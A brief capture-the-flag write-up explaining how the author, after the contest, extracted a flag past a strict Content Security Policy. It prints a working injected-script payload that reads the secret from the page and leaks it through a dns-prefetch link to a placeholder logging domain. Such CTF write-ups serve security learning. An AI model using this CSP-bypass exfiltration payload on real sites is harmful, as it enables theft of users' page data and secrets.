# Trivial

### Problem 

The flag is stored in the localStorage of a browser located on the server. We are given a route to inject HTML into an iframe into the home page opened on the browser. The page sets a Content Security Policy of `default-src 'none';` effectively blocking all requests, even to itself. The iframe also has a sandbox restriction of `allow-scripts`, which prevents popups and access to the parent document, but allows scripts.

### Solution

I did not solve this challenge during the contest window. However I did try out the solution myself afterwards. 

Obtaining the flag is easy, we can extract the contents of the flag using a simple regex on the document text: 
```js
/CTF\{(.*)\}/.exec(document.body.innerText)[1];
```
The hard part is actually sending the flag. Due to the strict Content Security Policy, there was hardly a way to do it. However it appears that using DNS prefetching can bypass this, and the flag can be received by logging DNS requests. 

[messwithdns](https://messwithdns.net/) was a suggested tool, so by clicking `Start Experimenting` and then using the subdomain in the following HTML, we can bypass the CSP and obtain the flag in the request log: 
```html
<script>
document.getElementsByTagName('body')[0].innerHTML += `\<link rel="dns-prefetch" href="//${/CTF\{(.*)\}/.exec(document.body.innerText)[1]}.DOMAIN_HERE"\>`
</script>
```


Our flag is then `CTF{csp_is_not_a_security_feature}`
